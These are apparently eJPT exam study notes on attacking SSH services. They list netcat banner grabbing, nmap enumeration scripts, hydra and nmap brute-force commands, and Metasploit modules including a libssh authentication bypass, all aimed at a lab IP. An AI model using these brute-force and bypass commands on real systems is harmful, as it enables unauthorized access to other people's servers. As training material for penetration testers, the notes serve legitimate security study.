## SSH - p22

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

This command is used to connect to the target machine with the user root.
```
ssh root@10.10.10.1
```
Netcat is useful to retrieve the service banner.
```
nc 10.10.10.1 22
```
Enumerate key Algorithms.
```
nmap 10.10.10.1 -p 22 --script ssh2-enum-algos
```
Retrieve public SSH-RSA key.
```
nmap 10.10.10.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full
```
Retrieve the supported authentication methods for the selected user, such as public-key or password. If the script doesn’t receive a response, we can connect to the target machine without authentication.
```
nmap 10.10.10.1 -p 22 --script ssh-auth-methods --scripts-args=“ssh.user=student”
```
### Nmap brute-force
```
nmap 10.10.10.1 -p 22 --script ssh-brute --script-args userdb=userlist.txt,passdb=passwordlist.txt
```
### Hydra brute-force attack
```
hydra -L userlist.txt -P passwordlist.txt 10.10.10.1 ssh
```
## METASPLOIT
```
search type:auxiliary name:ssh_version
search ssh_login -> brute force
search ssh_enumusers
```

## Linux - Exploiting SSH Server

SSH libssh V0.6.0-0.8.0 - C library - vulnerable service.
```
search libssh_auth_bypass
set SPAWN_PTY true
```
